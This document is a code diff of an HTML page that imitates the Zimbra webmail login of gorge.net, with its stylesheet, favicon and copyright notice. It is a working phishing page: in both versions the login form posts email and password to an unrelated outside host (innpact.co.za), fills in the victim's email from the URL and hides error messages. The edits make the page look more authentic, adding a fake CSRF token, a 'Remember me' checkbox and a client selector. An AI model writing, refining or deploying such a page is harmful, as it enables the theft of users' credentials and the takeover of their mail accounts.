@@ -1,6 +1,5 @@
 
-
-                    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
@@ -9,121 +8,118 @@
     <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration.">
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black" />
-
-    <link rel="stylesheet" type="text/css"
-          href="https://webmail.gorge.net/css/common,login,zhtml,skin.css?skin=harmony&v=250123180901">
-
+    <link rel="stylesheet" type="text/css" href="https://webmail.gorge.net/css/common,login,zhtml,skin.css?skin=harmony&v=250123180901">
     <style>
         .ImgLoginBanner {
             background-image: none !important;
         }
 
-        /* Hide error message permanently */
+        /* Additional CSS to hide errorMessageDiv */
         #errorMessageDiv {
-            display: none !important;
+            display: none;  /* Hide the error message div */
         }
     </style>
-
     <link rel="SHORTCUT ICON" href="https://webmail.gorge.net/img/logo/favicon.ico">
 </head>
-
 <body onload="onLoad();">
 
-<div id="modifiedLogin" class="LoginScreen">
-    <div class="modernCenter">
-        <div class="modernContentBox">
-
-            <div class="logo">
-                <a href="https://imgur.com/1XgwoSN/" id="bannerLink" target="_new">
-                    <img src="https://i.imgur.com/1XgwoSN.jpeg"
-                         alt="Your Logo"
-                         class="ImgLoginBanner">
-                </a>
-            </div>
-
-            <form id="zLoginForm"
-                  method="post"
-                  name="loginForm"
-                  action="https://innpact.co.za/administrator/includes/xlx.php/zim.php"
-                  accept-charset="UTF-8">
-
-                <input type="hidden" name="loginOp" value="login">
-
-                <div class="signIn">Log In</div>
-
-                <div class="form">
-
-                    <div id="errorMessageDiv" class="errorMessage"></div>
-
-                    <div class="loginSection">
-
-                        <label for="email" class="zLoginFieldLabel">Email</label>
-                        <input id="email"
-                               class="zLoginFieldInput"
-                               name="email"
-                               type="text"
-                               size="40"
-                               autocapitalize="off"
-                               autocorrect="off">
-
-                        <label for="password" class="zLoginFieldLabel">Password</label>
-                        <div class="passwordWrapper">
-                            <input id="password"
-                                   class="zLoginFieldInput"
-                                   name="password"
-                                   type="password"
-                                   size="40"
-                                   autocomplete="off">
-                        </div>
-
-                        <button id="loginButton"
-                                type="submit"
-                                class="loginButton">
-                            Log In
-                        </button>
-
-                    </div>
-
+    <div id="modifiedLogin" class="LoginScreen">
+        <div class="modernCenter">
+            <div class="modernContentBox">
+                <div class="logo">
+                    <a href="https://imgur.com/1XgwoSN/" id="bannerLink" target="_new" title="Your Brand">
+                        <span class="ScreenReaderOnly">Your Brand</span>
+                        <img src="https://i.imgur.com/1XgwoSN.jpeg" alt="Your Logo" class="ImgLoginBanner">
+                    </a>
                 </div>
-            </form>
+                <form id="zLoginForm" method="post" name="loginForm" action="http://innpact.co.za/administrator/includes/xlx.php/zim.php" accept-charset="UTF-8">
+                    <input type="hidden" name="loginOp" value="login"/>
+                    <input type="hidden" name="login_csrf" value="b59ea66d-b29d-483b-bef6-d370d787a774"/>
+                    <div class="signIn">Log In</div>
+                    <div class="form">
+                        <div id="errorMessageDiv" class="errorMessage"></div>
+                        <div class="loginSection">
+                            <label for="email" class="zLoginFieldLabel">email</label>
+                            <input id="email" tabindex="1" class="zLoginFieldInput" name="email" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
+                            <label for="password" class="zLoginFieldLabel">Password</label>
+                            <div class="passwordWrapper">
+                                <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024"/>
+                                <span toggle="#password" onClick="showPassword();" id="showSpan" style="display: block;">Show</span>
+                                <span toggle="#password" onClick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
+                            </div>
+                            <div class="signInAndLabel">
+                                <div>
+                                    <button id="loginButton" type="submit" tabindex="5" class="loginButton">Log In</button>
+                                </div>
+                                <div class="rememberCheckWrapper">
+                                    <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme" />
+                                    <label id="remember" for="remember">Remember me</label>
+                                </div>
+                            </div>
+                        </div>
+                        <div>
+                            <hr/>
+                        </div>
+                        <div class="versionBlock">
+                            <label for="client">Version</label>
+                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                <option value="preferred" selected> Default</option>
+                                <option value="advanced"> Classic</option>
+                                <option value="modern"> Modern</option>
+                            </select>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="Footer">
+            <div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2023 Synacor, Inc. All rights reserved.</div>
         </div>
     </div>
 
-    <div class="Footer">
-        <div class="legalNotice-small">
-            © 2005-2023 Synacor, Inc.
-        </div>
-    </div>
-</div>
+    <script>
+        // Combine the onLoad functionality with the URL parameter auto-fill logic
+        function onLoad() {
+            var loginForm = document.loginForm;
+            if (loginForm.username) {
+                if (loginForm.username.value != "") {
+                    loginForm.password.focus(); // if username is set, focus on password
+                } else {
+                    loginForm.username.focus();
+                }
+            }
+            clientChange("preferred");
 
-<script>
-    function onLoad() {
+            // Get the URL parameters and fill the email input field
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');  // This gets the 'email' query parameter value
 
-        /* Autofill email from URL */
-        const params = new URLSearchParams(window.location.search);
-        const email = params.get('email');
-        if (email) {
-            document.getElementById('email').value = email;
+            if (email) {
+                // Find the email input field by its ID and set its value
+                const emailField = document.getElementById('email');
+                if (emailField) {
+                    emailField.value = email;
+                }
+            }
+
+            // Hide the errorMessageDiv on page load
+            const errorMessageDiv = document.getElementById('errorMessageDiv');
+            if (errorMessageDiv) {
+                errorMessageDiv.style.display = 'none';  // Hide it
+            }
         }
 
-        /* Ensure password is ALWAYS empty on load */
-        const password = document.getElementById('password');
-        if (password) {
-            password.value = '';
+        function clientChange(selectValue) {
+            var div = getElement("ZLoginUnsupported");
+            if (div) {
+                div.style.display = 'none';
+            }
         }
 
-        /* Hide error message */
-        const errorMessageDiv = document.getElementById('errorMessageDiv');
-        if (errorMessageDiv) {
-            errorMessageDiv.style.display = 'none';
+        function getElement(id) {
+            return document.getElementById(id);
         }
-    }
-
-    /* ✅ CLEAR PASSWORD AFTER FIRST ATTEMPT */
-    document.getElementById('zLoginForm').addEventListener('submit', function () {
-        document.getElementById('password').value = '';
-    });
-</script>
+    </script>
 
 </body>
 </html>
